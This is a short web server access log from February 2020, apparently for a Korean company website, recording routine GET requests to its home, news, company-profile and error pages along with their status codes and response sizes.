38.99.62.91 - - [07/Feb/2020:11:59:35 +0900] "GET /home/news/news/view.do?page=2&num=8 HTTP/1.1" 200 9169
39.104.235.66 - - [07/Feb/2020:12:01:57 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
175.209.37.121 - - [07/Feb/2020:12:05:02 +0900] "GET /index.jsp HTTP/1.1" 302 -
175.209.37.121 - - [07/Feb/2020:12:05:02 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
175.209.37.121 - - [07/Feb/2020:12:05:05 +0900] "GET /home/contact/contact.do HTTP/1.1" 200 5224
119.192.197.203 - - [07/Feb/2020:12:09:02 +0900] "GET /index.jsp HTTP/1.1" 302 -
119.192.197.203 - - [07/Feb/2020:12:09:02 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
119.192.197.203 - - [07/Feb/2020:12:09:11 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 30366
119.192.197.203 - - [07/Feb/2020:12:11:46 +0900] "GET /home/whoweare/china.do HTTP/1.1" 200 10340
5.9.112.210 - - [07/Feb/2020:12:12:58 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
157.55.39.165 - - [07/Feb/2020:12:15:10 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
92.28.90.88 - - [07/Feb/2020:12:15:55 +0900] "GET /index.jsp HTTP/1.1" 302 -
139.162.106.181 - - [07/Feb/2020:12:22:03 +0900] "GET /index.jsp HTTP/1.1" 302 -
193.111.62.163 - - [07/Feb/2020:12:32:42 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
114.234.152.139 - - [07/Feb/2020:12:33:20 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
157.55.39.134 - - [07/Feb/2020:12:35:37 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
52.24.238.252 - - [07/Feb/2020:12:44:12 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
157.55.39.165 - - [07/Feb/2020:12:45:47 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
103.131.71.128 - - [07/Feb/2020:12:48:49 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
34.199.176.251 - - [07/Feb/2020:12:50:46 +0900] "GET /home/news/news/view.do?num=2 HTTP/1.1" 200 6974
34.199.176.251 - - [07/Feb/2020:12:50:47 +0900] "GET /home/news/news/view.do HTTP/1.1" 500 3570
14.52.95.10 - - [07/Feb/2020:13:00:39 +0900] "GET /index.jsp HTTP/1.1" 302 -
14.52.95.10 - - [07/Feb/2020:13:00:39 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 11080
14.52.95.10 - - [07/Feb/2020:13:00:42 +0900] "GET /home/en/watwedo/overview.do HTTP/1.1" 200 6156
14.52.95.10 - - [07/Feb/2020:13:00:46 +0900] "GET /home/en/watwedo/history.do HTTP/1.1" 200 10541
14.52.95.10 - - [07/Feb/2020:13:00:46 +0900] "GET /home/en/watwedo/philosophy.do HTTP/1.1" 200 7112
14.52.95.10 - - [07/Feb/2020:13:00:47 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
14.52.95.10 - - [07/Feb/2020:13:00:49 +0900] "GET /home/watwedo/overview.do HTTP/1.1" 200 6147
14.52.95.10 - - [07/Feb/2020:13:00:50 +0900] "GET /home/watwedo/philosophy.do HTTP/1.1" 200 7162
